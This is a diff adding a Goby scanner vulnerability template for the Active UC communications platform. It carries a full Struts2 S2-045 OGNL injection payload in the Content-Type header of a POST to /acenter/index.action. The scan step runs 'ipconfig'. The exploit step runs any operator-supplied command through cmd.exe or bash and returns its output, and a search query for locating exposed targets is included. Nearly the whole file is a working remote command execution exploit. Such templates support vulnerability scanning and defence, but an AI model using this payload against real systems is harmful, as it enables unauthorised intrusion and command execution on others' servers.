@@ -1,0 +1,102 @@
+{
+      "Name": "Active UC index.action 远程命令执行漏洞",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "title=\"网动统一通信平台(Active UC)\"",
+      "Description": "网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令",
+      "Product": "网动统一通信平台(Active UC)",
+      "Homepage": "https://gobies.org/",
+      "Author": "luckying",
+      "Impact": "",
+      "Recommandation": "",
+      "References": [
+            "https://gobies.org/"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "whoami",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/acenter/index.action",
+                        "follow_redirect": false,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
+                              "Connection": "close",
+                              "Cookie": "SessionId=96F3F15432E0660E0654B1CE240C4C36",
+                              "Charsert": "UTF-8",
+                              "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ipconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170",
+                              "Cache-Control": "no-cache",
+                              "Pragma": "no-cache"
+                        },
+                        "data_type": "text",
+                        "data": "-----------------------------18012721719170\nContent-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\"\nContent-Type: text/plain\n-----------------------------18012721719170"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Windows IP",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/acenter/index.action",
+                        "follow_redirect": false,
+                        "header": {
+                              "Accept-Encoding": "gzip, deflate",
+                              "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
+                              "Connection": "close",
+                              "Cookie": "SessionId=96F3F15432E0660E0654B1CE240C4C36",
+                              "Charsert": "UTF-8",
+                              "Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{{{Cmd}}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170",
+                              "Cache-Control": "no-cache",
+                              "Pragma": "no-cache"
+                        },
+                        "data_type": "text",
+                        "data": "-----------------------------18012721719170\nContent-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\"\nContent-Type: text/plain\n-----------------------------18012721719170"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "Windows IP",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-06-28 10:08:54",
+      "GobyVersion": "1.8.268"
+}
